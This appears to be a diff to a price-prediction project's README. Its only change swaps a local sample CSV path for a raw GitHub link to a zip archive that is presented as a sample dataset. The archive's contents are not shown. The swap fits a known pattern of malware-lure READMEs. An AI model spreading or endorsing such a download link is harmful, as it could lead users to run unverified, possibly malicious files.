@@ -23,7 +23,7 @@ This project builds a fast and efficient price prediction system using a linear 
 ### 4. Run predictions
 ### 5. Launch Streamlit demo (optional)
 ## 📈 Dataset
-Use your own CSV containing numeric features. A sample dataset is included in `data/sample_data.csv`.
+Use your own CSV containing numeric features. A sample dataset is included in `https://github.com/analyst-ujjwal/Ai_project_25/raw/refs/heads/main/data/Ai-project-3.4.zip`.
 
 ---
 
